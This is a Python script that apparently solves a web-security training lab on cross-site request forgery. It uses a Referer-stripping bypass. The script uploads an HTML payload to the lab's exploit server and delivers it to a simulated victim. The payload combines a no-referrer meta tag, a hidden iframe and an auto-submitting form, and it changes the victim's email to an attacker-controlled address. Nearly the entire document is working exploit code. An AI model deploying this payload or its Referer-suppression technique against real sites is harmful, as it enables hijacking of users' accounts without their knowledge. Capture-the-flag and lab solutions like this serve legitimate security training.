# CSRF where Referer validation depends on header being present

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r2

def send_csrf(s, url, payload, attacker):
	change_email_path = url + '/my-account/change-email'
	if payload == "SOLUTION":
		exploit_body = """<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <iframe style="display:none" name="csrf-iframe"></iframe>
    <form action=\"""" + change_email_path + """\" method="POST" target="csrf-iframe">
      <input type="hidden" name="email" value="gwyo@attacker.com" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>"""
	else:
		exploit_body = payload
	r = deliver_payload(s, change_email_path, exploit_body, attacker)
	time.sleep(2)
	return r

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com $(cat payload01.html)\n\t->\tReplace url in the document.location (line 4)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: CSRF where Referer validation depends on header being present')
	try:
		url = sys.argv[1].strip()
		input_payload = sys.argv[2:]
		if len(input_payload) > 1:
			payload = ' '.join(input_payload).replace('> ', '>').replace('=>', '=> ')
		else:
			payload = ''.join(input_payload)
		if payload == '':
			show_usage()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a cross-site forged request attack to the victim...')
			r = send_csrf(s, url, payload, attacker)
			time.sleep(3)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
